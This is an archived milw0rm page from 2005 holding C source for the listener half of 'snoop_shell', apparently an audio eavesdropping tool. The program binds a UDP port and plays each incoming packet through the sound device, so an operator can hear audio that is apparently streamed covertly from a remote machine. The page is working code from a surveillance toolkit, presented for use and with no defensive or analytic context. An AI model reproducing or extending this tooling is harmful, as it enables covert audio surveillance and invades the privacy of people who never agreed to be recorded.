<html><head><title>Snoops Listener (Ref ID: 1294)</title></head><pre>// Phar's snoop_shell listener /str0ke

#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;time.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;

#include &lt;linux/soundcard.h&gt;

#define HELLO_PORT 8193
#define MSGBUFSIZE 1024

#define RATE 8192 //sample rate
#define SIZE 16  //bits per sample
#define CHANNELS 1 //channels of audio


main(int argc, char *argv[]){
struct sockaddr_in addr;
int fd,dsp, nbytes,addrlen;
struct ip_mreq mreq;
char msgbuf[MSGBUFSIZE];
int arg;

	if ((fd=socket(AF_INET,SOCK_DGRAM,0)) &lt; 0) {
	  perror(&quot;socket&quot;);
	  exit(1);
     }


        dsp = open(&quot;/dev/dsp&quot;, O_RDWR);
        /* set sampling parameters */
        arg = SIZE;      /* sample size */
        ioctl(dsp, SOUND_PCM_WRITE_BITS, &amp;arg);

        arg = CHANNELS;  /* mono or stereo */
        ioctl(dsp, SOUND_PCM_WRITE_CHANNELS, &amp;arg);

        arg = RATE;      /* sampling rate */
        ioctl(dsp, SOUND_PCM_WRITE_RATE, &amp;arg);


     /* set up destination address */
     memset(&amp;addr,0,sizeof(addr));
     addr.sin_family=AF_INET;
     addr.sin_addr.s_addr=htonl(INADDR_ANY); /* N.B.: differs from sender */
     addr.sin_port=htons(8193);
     
     /* bind to receive address */
     if (bind(fd,(struct sockaddr *) &amp;addr,sizeof(addr)) &lt; 0) {
	  perror(&quot;bind&quot;);
	  exit(1);
     }
     

     /* now just enter a read-print loop */
     while (1) {
	  addrlen=sizeof(addr);
	  if ((nbytes=recvfrom(fd,msgbuf,MSGBUFSIZE,0,(struct sockaddr *) &amp;addr,&amp;addrlen)) &lt; 0) {
		perror(&quot;recvfrom&quot;);
	  }else{
		write(dsp,msgbuf,nbytes);
	  }
//	  puts(msgbuf);
	printf(&quot;%u bytes\n&quot;,nbytes);
     }
}

// milw0rm.com [2005-11-04]</pre></html>